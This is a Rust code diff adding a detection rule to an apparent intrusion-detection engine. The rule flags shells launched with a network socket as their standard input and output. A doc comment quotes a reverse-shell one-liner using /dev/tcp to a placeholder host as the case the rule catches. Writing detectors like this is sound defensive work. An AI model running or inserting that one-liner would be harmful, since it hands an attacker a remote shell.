@@ -45,6 +45,7 @@ pub fn detect(ev: &Event, graph: &ProcessGraph) -> Vec<Signal> {
             let mut sigs = namespace_escape(ev, key, graph);
             sigs.extend(exec_from_suspicious_dir(ev, key, graph));
             sigs.extend(shell_from_network_daemon(ev, key, graph));
+            sigs.extend(socket_backed_shell(ev, key));
             sigs
         }
         _ => Vec::new(),
@@ -501,6 +502,45 @@ fn shell_from_network_daemon(ev: &Event, key: ProcKey, graph: &ProcessGraph) -> 
         )],
         None => Vec::new(),
     }
+}
+
+/// A shell whose standard descriptors are a TCP socket.
+///
+/// `shell_from_network_daemon` asks who the parent is, and structurally cannot
+/// catch this: `bash -i >& /dev/tcp/host/4444 0>&1` has no recognisable daemon
+/// anywhere in its ancestry, because it does not need one. What makes it a
+/// reverse shell is the descriptor, not the lineage -- an ordinary shell
+/// inherits a tty, a pipe or a file, and one reading its commands from a
+/// network connection has no innocent version.
+///
+/// Scored at 70, above the two daemon signals, because it is a narrower shape
+/// with less room for an accident. It still cannot reach CRITICAL alone: what
+/// the shell then does is the rest of the story, and chaining is how that gets
+/// told.
+///
+/// Restricted to shells. inetd, xinetd and systemd units with `Accept=yes` all
+/// exec a service with the accepted connection already on fd 0/1/2, which is
+/// the identical descriptor shape -- so matching on the descriptor alone would
+/// make every socket-activated service an incident. That case is
+/// `tests/noise/inetd_style_service.sh`. Interpreters are excluded for the same
+/// reason and more sharply: a socket-activated service written in Python is
+/// ordinary, and the interpreter list is broad.
+fn socket_backed_shell(ev: &Event, key: ProcKey) -> Vec<Signal> {
+    if !ev.socket_stdio || !is_shell(&ev.filename) {
+        return Vec::new();
+    }
+    vec![Signal::new(
+        "socket_backed_shell",
+        70,
+        &["T1059.004", "T1571"],
+        key,
+        ev.ts_ns,
+        format!(
+            "{} was exec'd with a network socket on its standard descriptors \
+             (reverse shell)",
+            shell_name(&ev.filename)
+        ),
+    )]
 }
 
 fn shell_name(path: &str) -> &str {
